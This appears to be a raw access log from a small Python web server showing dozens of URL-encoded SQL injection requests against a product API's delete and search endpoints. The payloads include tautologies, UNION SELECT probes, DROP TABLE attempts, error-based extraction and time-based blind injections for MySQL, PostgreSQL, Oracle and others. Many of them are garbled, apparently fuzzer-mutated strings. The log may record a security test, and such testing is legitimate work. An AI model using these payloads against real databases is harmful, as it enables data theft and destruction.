Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - DELETE /produtos/test1'%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20as%20fksm%20where%209714%20=%209714 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20where%209159%20=%209159 HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20(%20case%20when%20(%202394%20=%204530%20)%20then%202394%20else%202394*%20(%20select%202394%20from%20information_schema.character_sets%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22$%7B%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20'rryx'%20where%201228%20=%201228%20union%20all%20select%20null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20in%20boolean%20mode%20)%20or%20exp%20(%20~%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%206270%20=%206270,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20x%20)%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20as%20xqlq%20where%202399%20=%202399%20and%202853%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%202853%20=%202853%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20( HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20and%20extractvalue%20(%207982,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20elt%20(%207982%20=%207982,1%20)%20)%20)%20,0x717a767a71%20)%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20'qpmf'%20where%20590%20=%205590%20or%207427%20=%20dbms_pipe.receive_message%20(%20chr%20(%20116%20)%20%7C%7Cchr%20(%2087%20)%20%7C%7Cchr%20(%2090%20)%20%7C%7Cchr%20(%20109%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20plbt%20where%204368%20=%204368%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=)))) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20and%206055%20=%20ctxsys.drithsx.sn%20(%206055,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%206055%20=%206055%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7C HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20where%208578=8578%20and%204775=4447%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20rxhe%20where%203838%20=%203838%20or%207417%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20nlzg%20where%201482%20=%201482%20procedure%20analyse%20(%20extractvalue%20(%205840,concat%20(%200x5c,0x7171706a71,%20(%20select%20(%20case%20when%20(%205840%20=%205840%20)%20then%201%20else%200%20end%20)%20)%20,0x717a767a71%20)%20)%20,1%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20and%20(%20(%20(%20'zeum'%20=%20'zeu HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20)%20and%20sleep%20(%205%20)%20and%20(%20(%20(%20'hwjy'%20=%20'hwjj HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20(%20case%20when%20(%204780%20=%204432%20)%20then%204780%20else%204780*%20(%20select%204780%20from%20mysql.db%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1')%20where%203367=3367%20and%206510=(select%20count(*)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20'iify'%20where%206257%20=%206257%20or%206793%20=%20(%20select%206793%20from%20pg_sleep%20(%205%20)%20)%20)%20+' HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20'ypkr'%20=%20'ypkr%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22,;%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20)%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cc HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+(select%20'spsw'%20where%201247=1247%20or%201022=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20dooq%20where%207911%20=%207911 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271+--&categoria=%27+OR+%271%27%3D%271+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271&categoria=%27+OR+%271%27%3D%271 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%2F%2A%2A%2F&categoria=%27+OR+%271%27%3D%271%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+OR+%271%27%3D%271%23&categoria=%27+OR+%271%27%3D%271%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%2C+%27asenupel%2C+%28+%27anD+%27ichat%27+like+%27cath&categoria=%27+UNION+SELECT+%40+%2C+users%2Cadechure+%2C+%27asenupel%2C+%28+%27anD+%27ichat%27+like+%27cath HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28+--&categoria=%27+UNION+SELECT+%40%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calectare%27+%29+%2C+vale_s+t%28+%29&categoria=%27+UNION+SELECT+%40+%2C+users%2Calectare%27+%29+%2C+vale_s+t%28+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+--&categoria=%27+UNION+SELECT+%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumpape+tabe+%29+%3B&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmatecbumpape+tabe+%29+%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+%7C%7C+%27i%27+NOT+LIKE+%27i&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LiKE+%273%27+%7C%7C+%27i%27+NOT+LIKE+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_pare%29nom+table_name+F+LIMS+USER%3B+AND+%27i%27&categoria=%27+UNION+SELECT+%28+%2C+users%2Cgverpabp_pare%29nom+table_name+F+LIMS+USER%3B+AND+%27i%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_samerial%2Cnels+%29+%2C+%40%40VERSION+NILL+%27+%27+AND+1+%3D+1+--&categoria=%27+UNION+SELECT+%28+table_samerial%2Cnels+%29+%2C+%40%40VERSION+NILL+%27+%27+AND+1+%3D+1+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmacce%27+%28+11%2C0%2C0x7170766107%2C+8+%28+select+1+0+%29+from+information_schema.system_users+%29+and+%22kjfz%22+%3D+%22kkzi&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmacce%27+%28+11%2C0%2C0x7170766107%2C+8+%28+select+1+0+%29+from+information_schema.system_users+%29+and+%22kjfz%22+%3D+%22kkzi HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschart%27+%3B%28+%3Auserint%2Ball_users+%29+%2F&categoria=%27+UNION+SELECT+%40+%2C+userschart%27+%3B%28+%3Auserint%2Ball_users+%29+%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B&categoria=%27+UNION+SELECT+table_schema%2Ctable_name+FROM+iname_1%3B HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24tyly%2C+%29+and+%28+%27i%27+%3D+%27i&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28chars+ly%24tyly%2C+%29+and+%28+%27i%27+%3D+%27i HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+velectevertime+to_1&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28count+%29+velectevertime+to_1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+table_sermate_series+%28+513%2C1+5+ANIMET+%28+5+%2C1%2C0%2C10%2F%2A%2A%2F&categoria=%27+UNION+SELECT+%28+table_sermate_series+%28+513%2C1+5+ANIMET+%28+5+%2C1%2C0%2C10%2F%2A%2A%2F HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40%40+--&categoria=%27+UNION+SELECT+%40%40%40+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%28&categoria=%27+UNION+SELECT+%40%28 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%274b0b110110101010110111101011011111001111001101111101010000001011110111%29+%29+%2A+AND+%28+%28+%28+%22%25%22&categoria=%27+UNION+SELECT+%40%40verscomand+3%29+LIKE+%274b0b110110101010110111101011011111001111001101111101010000001011110111%29+%29+%2A+AND+%28+%28+%28+%22%25%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+userschame%27lame+%27tabe%27+and+%271%27+%3D+%271%27%23&categoria=%27+UNION+SELECT+%40+%2C+userschame%27lame+%27tabe%27+and+%271%27+%3D+%271%27%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cusernatelils+%27&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%3B%29+%2Cusernatelils+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+--&categoria=%27+UNION+SELECT+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charely+tayle+%29+%3Bverd+and+%27abcva&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charely+tayle+%29+%3Bverd+and+%27abcva HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+converse+%29+not+tebe+nems%27+--&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+converse+%29+not+tebe+nems%27+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C110+%29+%29+and+%27blbe%27+like+%27blbe&categoria=%27+UNION+SELECT+%40+%2C+users%2Cmade+%28charentyall+like+benchmart+%29+%2C1000%2C110+%29+%29+and+%27blbe%27+like+%27blbe HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%28+%2C+useRs%2Choge+char+and+tausernited+veriob_ubest+%28+vele+%28+t4b2%2C1%2C0b11+%29+and+%28+%22x&categoria=%27+UNION+SELECT+%28+%2C+useRs%2Choge+char+and+tausernited+veriob_ubest+%28+vele+%28+t4b2%2C1%2C0b11+%29+and+%28+%22x HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27ybl%27+%3D+%27yblb&categoria=%27+UNION+SELECT+%40+%2C+users%2Calecture%27+%29+and+%27ybl%27+%3D+%27yblb HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SE&categoria=%27%3B+DROP+TABLE+SE HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%28+--&categoria=%27%3B+DROP+TABLE+%28+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+S&categoria=%27%3B+DROP+TABLE+S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEm&categoria=%27%3B+DROP+TABLE+SEm HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM&categoria=%27%3B+DROP+TABLE+SEM HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+--&categoria=%27%3B+DROP+TABLE+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM+UNOM+USER+%28+%27lest%2Cvolub%27%2C+%28+useran%2C+hobal+ta&categoria=%27%3B+DROP+TABLE+SEM+UNOM+USER+%28+%27lest%2Cvolub%27%2C+%28+useran%2C+hobal+ta HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SEM+%3CULDEraterater+Naile+Aincall+1+9+%29+%29+and+3824+%3D+benchmark+%28+5000000%2Cmd5+%28+0x76555642+%29+%29+and+%28+%28+%27bemh%27+%3D+%27bemh&categoria=%27%3B+DROP+TABLE+SEM+%3CULDEraterater+Naile+Aincall+1+9+%29+%29+and+3824+%3D+benchmark+%28+5000000%2Cmd5+%28+0x76555642+%29+%29+and+%28+%28+%27bemh%27+%3D+%27bemh HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+SET+%2Bu&categoria=%27%3B+DROP+TABLE+SET+%2Bu HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%27%3B+DROP+TABLE+%28+%2C0x67036+%29+%2Cclar+%28+3070%2C+%28+char+%28+409+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+char+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+c%29%29%29%29&categoria=%27%3B+DROP+TABLE+%28+%2C0x67036+%29+%2Cclar+%28+3070%2C+%28+char+%28+409+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+char+%28+113+%29+%2Bchar+%28+112+%29+%2Bchar+%28+106+%29+%2Bchar+%28+113+%29+%2B+%28+select+%28+case+when+%28+3715+%3D+3715+%29+then+char+%28+49+%29+else+c%29%29%29%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+--&categoria=%22+OR+%221%22%3D%221%22+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221+--&categoria=%22+OR+%221%22%3D%221+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%22+OR+%221%22%3D%221%22+or+1%3D1%23&categoria=%22+OR+%221%22%3D%221%22+or+1%3D1%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%25%27+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%27%25%27+%3D+%27&categoria=1%25%27+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29+and+%27%25%27+%3D+%27 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-1802%27+or+7931+%3D+5841+--&categoria=-1802%27+or+7931+%3D+5841+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+%23+msrb&categoria=1+or+5286+%3D+%28+select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+%29+%23+msrb HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-4091%29+as+lqty+where+3806%3D3806+or+5023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%285023%3D5023%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+--&categoria=-4091%29+as+lqty+where+3806%3D3806+or+5023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select+%28case+when+%285023%3D5023%29+then+1+else+0+end%29+from+dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+%2A+from+users+where+id+%3D+1+or+%22%24%7B%22+or+1+%3D+1+--+1&categoria=select+%2A+from+users+where+id+%3D+1+or+%22%24%7B%22+or+1+%3D+1+--+1 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=3%22%5B+%26%26+%28selEcT+0X0b0x1b0o0X0b0x29a0O0x0X8%29+%5DliKe+%3B%7D%28+SelECT+cOUnT+%28+%2A+%29+fRoM+sYSusERs+as+SyS3o0o0%2CsySUseRs-as+sYs0o0X0B0O5%2CSYsuSErS+as+Sys3%2CsYsuSErS+AS+syS0B0X4%2CsYsuSErS+as+syS5%2CSySUSErs+as+syS0o0x6%2CsYSUsErS+as+Sys0X0o0o0B0b1106110%2CSYsuserS+AS+S&categoria=3%22%5B+%26%26+%28selEcT+0X0b0x1b0o0X0b0x29a0O0x0X8%29+%5DliKe+%3B%7D%28+SelECT+cOUnT+%28+%2A+%29+fRoM+sYSusERs+as+SyS3o0o0%2CsySUseRs-as+sYs0o0X0B0O5%2CSYsuSErS+as+Sys3%2CsYsuSErS+AS+syS0B0X4%2CsYsuSErS+as+syS5%2CSySUSErs+as+syS0o0x6%2CsYSUsErS+as+Sys0X0o0o0B0b1106110%2CSYsuserS+AS+S HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-3107%27+%29+where+7782+%3D+7782+or+8571+%3D+8571+--&categoria=-3107%27+%29+where+7782+%3D+7782+or+8571+%3D+8571+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+and+%27dfwj%27+%3D+%27dfwj&categoria=select+count+%28+%2A+%29+from+generate_series+%28+1%2C5000000+%29+and+%27dfwj%27+%3D+%27dfwj HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1+%29+as+khkv+where+2944+%3D+2944+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.charac&categoria=1+%29+as+khkv+where+2944+%3D+2944+and+%28+select+9067+from+%28+select+count+%28+%2A+%29+%2Cconcat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+9067+%3D+9067%2C1+%29+%29+%29+%2C0x717a767a71%2Cfloor+%28+rand+%28+0+%29+%2A2+%29+%29+x+from+information_schema.charac HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+%28+%27dbsm%27+%3D+%27dbsm&categoria=1%27+%29+%29+%29+or+2633+%3D+dbms_pipe.receive_message+%28+chr+%28+112+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+65+%29+%7C%7Cchr+%28+103+%29+%2C5+%29+and+%28+%28+%28+%27dbsm%27+%3D+%27dbsm HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%22%25%22+%3D+%22&categoria=select+count+%28+%2A+%29+from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5+and+%28+%22%25%22+%3D+%22 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2849%27+union+all+select+6491%2C6491%2C6491%2C6491%2C6491%2C6491%2C6491+--&categoria=-2849%27+union+all+select+6491%2C6491%2C6491%2C6491%2C6491%2C6491%2C6491+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+%29+%29+%29+and+%28+select+2%2A+%28+if+%28+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+3484+%3D+3484%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+s+%29+%2C+8446744073709551610%2C+8446744073709551610+%29+%29+%29+and+%28+%28+%28+%27qppe%27+%3D+%27qppe&categoria=1%27+%29+%29+%29+and+%28+select+2%2A+%28+if+%28+%28+select+%2A+from+%28+select+concat+%28+0x7171706a71%2C+%28+select+%28+elt+%28+3484+%3D+3484%2C1+%29+%29+%29+%2C0x717a767a71%2C0x78+%29+%29+s+%29+%2C+8446744073709551610%2C+8446744073709551610+%29+%29+%29+and+%28+%28+%28+%27qppe%27+%3D+%27qppe HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27otys%27+where+6076+%3D+6076&categoria=1%27%7C%7C+%28+select+%27otys%27+where+6076+%3D+6076 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%2B+%28+select+%27mikf%27+where+5814+%3D+5814+or+5356+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+--&categoria=1%27%2B+%28+select+%27mikf%27+where+5814+%3D+5814+or+5356+%3D+%28+select+count+%28+%2A+%29+from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-1808%22+%29+%29+as+cask+where+2135+%3D+2135+or+5903+%3D+%28+%27qqpjq%27%7C%7C+%28+select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database+%29+%7C%7C%27qzvzq%27+%29+--&categoria=-1808%22+%29+%29+as+cask+where+2135+%3D+2135+or+5903+%3D+%28+%27qqpjq%27%7C%7C+%28+select+case+5903+when+5903+then+1+else+0+end+from+rdb%24database+%29+%7C%7C%27qzvzq%27+%29+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2314+union+all+select+4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580+--&categoria=-2314+union+all+select+4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580%2C4580+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29&categoria=1%27+and+%28+select+%2A+from+%28+select+%28+sleep+%28+5+%29+%29+%29+fzno+%29 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%22+where+9829+%3D+9829+order+by+1%23&categoria=1%22+where+9829+%3D+9829+order+by+1%23 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=1%27%7C%7C+%28+select+%27tkmc%27+from+dual+where+9675+%3D+9675+union+all+select+null%2Cnull%2Cnull%2Cnull+--&categoria=1%27%7C%7C+%28+select+%27tkmc%27+from+dual+where+9675+%3D+9675+union+all+select+null%2Cnull%2Cnull%2Cnull+-- HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523&categoria=%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520%2523 HTTP/1.1
172.18.0.1 - GET /produtos/busca/?nome=-2048+%29+%29+union+all+select+7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054+--&categoria=-2048+%29+%29+union+all+select+7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054%2C7054+-- HTTP/1.1
